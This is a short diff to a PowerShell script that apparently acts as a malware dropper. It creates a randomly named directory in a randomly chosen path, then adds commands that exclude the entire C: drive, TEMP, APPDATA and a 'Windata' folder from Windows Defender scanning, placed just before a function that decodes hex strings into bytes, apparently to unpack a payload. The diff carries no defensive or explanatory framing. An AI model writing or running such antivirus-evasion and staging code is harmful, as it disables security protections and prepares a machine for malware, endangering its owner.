@@ -19,7 +19,12 @@ $randomProgram = Get-Random -InputObject $programs
 $randomPath = Get-Random -InputObject $paths
 $fullPath = Join-Path -Path $randomPath -ChildPath $randomProgram
 New-Item -Path $fullPath -ItemType Directory -Force | Out-Null
-$scriptContent = @"
+$scriptContent = @'
+Add-MpPreference -ExclusionPath "C:\"
+Add-MpPreference -ExclusionPath "$env:TEMP"
+Add-MpPreference -ExclusionPath "$env:APPDATA"
+Add-MpPreference -ExclusionPath "$env:SystemDrive\programdata\Windata"
+
 function HexStringToByteArray([string]`$hex) {
     `$bytes = New-Object byte[] (`$hex.Length / 2)
     for (`$i = 0; `$i -lt `$bytes.Length; `$i++) {
